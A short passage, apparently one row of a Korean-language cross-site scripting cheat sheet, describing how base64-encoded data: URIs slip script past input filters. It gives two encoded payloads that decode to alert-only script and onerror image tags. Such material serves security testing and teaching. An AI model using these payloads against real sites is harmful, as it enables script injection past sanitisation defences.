...
| **Base64 인코딩 우회**         | Base64로 인코딩된 악성 스크립트를 삽입하여 필터링을 우회                                                          | `data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=` <br> `data:text/html;base64,PGltZyBzcmM9IngiIG9uZXJyb3I9ImFsZXJ0KDEpIj4=`                                             |
